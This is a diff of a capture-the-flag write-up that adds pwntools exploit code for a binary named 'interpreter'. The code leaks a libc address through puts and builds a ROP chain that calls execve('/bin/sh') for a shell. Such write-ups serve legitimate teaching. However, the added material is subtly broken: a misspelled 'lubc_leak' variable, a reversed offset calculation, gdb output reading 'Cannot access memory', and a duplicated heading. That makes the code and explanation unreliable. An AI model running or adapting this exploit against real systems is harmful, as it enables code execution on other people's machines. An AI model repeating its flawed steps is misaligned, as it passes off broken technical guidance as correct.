@@ -131,25 +131,6 @@ When `puts` attempts to print the buffer, it will keep reading past the end of `
 This unintended memory disclosure gives us exactly what we need to leak libc and prepare a reliable ROP chain.
 
 Let us take a look at how this behaves in GDB. We start by setting a breakpoint on the `puts` call so we can inspect the stack at that point.
-> To be able to properly simulate the remote environment, this challenge comes with a Dockerfile. Before we proceed with debugging we need to extract libc and ld from this continer and patch the binary that was given to us. You can find the docker file here:
-```Dockerfile
-FROM ubuntu:18.04
-
-RUN apt update 
-RUN apt install -y socat
-
-RUN /usr/sbin/useradd --no-create-home -u 1000 user
-
-COPY flag.txt /
-COPY interpreter /home/user/
-RUN chmod +x /home/user/interpreter
-
-EXPOSE 1337
-USER user
-
-CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"/home/user/interpreter"
-```
-{: .prompt-tip }
 ```
 mcsam@0x32:~$ gdb ./interpreter_patched
 ...
@@ -172,5 +153,98 @@ From the image above, we can clearly see our input on the stack. The highlighted
 
 One of these addresses is located **24 bytes** after the start of our input, and another is **32 bytes** after it. This means that if we supply **24 `A` characters**, the buffer will be completely filled and `puts` will continue reading until it encounters a null byte, leaking the first address. Likewise, providing **32 `A` characters** allows us to leak the next address on the stack.
 
-This gives us a reliable way to disclose libc addresses, which we can then use to calculate the libc base and build our ROP chain.
+Using pwntools we can read the leaked bytes and construct  the libc address.
+```python
+io = start()
 
+data = b"A" * 32
+
+io.sendlineafter(">", b"echo")
+io.sendafter("input:", data)
+
+libc_leak = io.recvline_contains(data).strip().split(data)[1]
+lubc_leak = struct.unpack("<Q", libc_leak.ljust(8, b"\x00"))[0]
+
+print(f"Leaked libc.so address: {hex(libc_leak)}")
+```
+
+Once we have leaked the libc address we need to find out what the offset is to the base of libc. We can do that easily by subtracting our leaked address from the libc base.
+```
+gef> vmmap
+[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+Start              End                Size               Offset             Perm Path
+0x0000555555400000 0x0000555555401000 0x0000000000001000 0x0000000000000000 r-x /home/mcsam/Desktop/ctf/hck4g/interpret/new/interpreter_patched  <-  $rip, $r12
+0x0000555555601000 0x0000555555602000 0x0000000000001000 0x0000000000001000 r-- /home/mcsam/Desktop/ctf/hck4g/interpret/new/interpreter_patched
+0x0000555555602000 0x0000555555603000 0x0000000000001000 0x0000000000002000 rw- /home/mcsam/Desktop/ctf/hck4g/interpret/new/interpreter_patched
+0x0000555555603000 0x0000555555605000 0x0000000000002000 0x0000000000004000 rw- /home/mcsam/Desktop/ctf/hck4g/interpret/new/interpreter_patched
+0x00007ffff7800000 0x00007ffff79e7000 0x00000000001e7000 0x0000000000000000 r-x /home/mcsam/Desktop/ctf/hck4g/interpret/new/libc.so.6  <-  $rcx
+0x00007ffff79e7000 0x00007ffff7be7000 0x0000000000200000 0x00000000001e7000 --- /home/mcsam/Desktop/ctf/hck4g/interpret/new/libc.so.6
+0x00007ffff7be7000 0x00007ffff7beb000 0x0000000000004000 0x00000000001e7000 r-- /home/mcsam/Desktop/ctf/hck4g/interpret/new/libc.so.6
+0x00007ffff7beb000 0x00007ffff7bed000 0x0000000000002000 0x00000000001eb000 rw- /home/mcsam/Desktop/ctf/hck4g/interpret/new/libc.so.6
+0x00007ffff7bed000 0x00007ffff7bf1000 0x0000000000004000 0x0000000000000000 rw-
+0x00007ffff7c00000 0x00007ffff7c29000 0x0000000000029000 0x0000000000000000 r-x /home/mcsam/Desktop/ctf/hck4g/interpret/new/ld-linux-x86-64.so.2
+0x00007ffff7e29000 0x00007ffff7e2a000 0x0000000000001000 0x0000000000029000 r-- /home/mcsam/Desktop/ctf/hck4g/interpret/new/ld-linux-x86-64.so.2
+0x00007ffff7e2a000 0x00007ffff7e2b000 0x0000000000001000 0x000000000002a000 rw- /home/mcsam/Desktop/ctf/hck4g/interpret/new/ld-linux-x86-64.so.2
+0x00007ffff7e2b000 0x00007ffff7e2c000 0x0000000000001000 0x0000000000000000 rw-
+0x00007ffff7ff7000 0x00007ffff7ff9000 0x0000000000002000 0x0000000000000000 rw- <tls-th1>
+0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 0x0000000000000000 r-- [vvar]
+0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000000000 r-x [vdso]
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rax, $rsp, $rbp, $rsi, $rdi, $r13
+0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
+gef> x 0x00007ffff79b3687 - 0x00007ffff7800000
+0x1b3687:	Cannot access memory at address 0x1b3687
+```
+
+In this case the offset to the libc base is 0x1b3687.
+
+### Crafting a full exploit
+### Crafting a Full Exploit
+
+Now that we have a libc leak, calculating the libc base address becomes straightforward. With the base address known, we can reliably build a ROP chain. Before doing that, however, we need to determine the exact offset to the saved return address so we know where our ROP chain should begin.
+
+Once the offset to the return address is identified, we can put everything together using a pwntools script and construct the final exploit.
+
+```python
+io = start()
+
+offset_to_ret = 179
+
+data = b"A" * 32
+
+io.sendlineafter(">", b"echo")
+io.sendafter("input:", data)
+
+libc_leak = io.recvline_contains(data).strip().split(data)[1]
+libc_leak = struct.unpack("<Q", libc_leak.ljust(8, b"\x00"))[0]
+
+print(f"Leaked libc.so address: {hex(libc_leak)}")
+
+libc.address = libc_leak - 0x1b3687
+
+print(f"Libc base address: {hex(libc.address)}")
+print(f"Libc execve address: {hex(libc.sym['execve'])}")
+
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
+
+payload = flat([
+    b"A" * offset_to_ret,
+    pop_rdi,
+    next(libc.search(b"/bin/sh\x00")),
+    pop_rsi,
+    0x0,
+    pop_rdx,
+    0x0,
+    pop_rdi + 1,
+    libc.sym['execve']
+])
+
+io.sendlineafter(">", b"DEBUG" + payload)
+
+io.interactive()
+```
+
+> Because the `DEBUG` command causes the program to break out of the infinite loop, we prepend our payload with it. This allows execution to continue past the loop and eventually return into our crafted ROP chain, resulting in code execution.
+{: .prompt-tip }
